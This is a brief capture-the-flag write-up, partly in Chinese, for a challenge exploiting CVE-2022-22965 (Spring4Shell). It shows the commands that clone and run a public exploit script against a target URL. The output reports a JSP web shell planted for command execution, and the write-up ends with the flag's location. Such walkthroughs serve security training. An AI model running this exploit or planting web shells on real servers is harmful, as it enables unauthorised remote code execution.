## How Beautiful Spring Is

CVE-2022-22965: Spring-Core-Rce, a.k.a. spring4shell

随便找个 poc 打一打就行了。

```bash
$ git clone https://github.com/reznok/Spring4Shell-POC
$ cd Spring4Shell-POC
$ python3 exploit.py --url http://ip:port/api/meow
[*] Resetting Log Variables.
[*] Response code: 200
[*] Modifying Log Configurations
[*] Response code: 200
[*] Response Code: 200
[*] Resetting Log Variables.
[*] Response code: 200
[+] Exploit completed
[+] Check your target for a shell
[+] File: shell.jsp
[+] Shell should be at: http://ip:port/shell.jsp?cmd=id
```

flag 在 根目录下的 `/'.fl@g_1S_h3re'`（动态 flag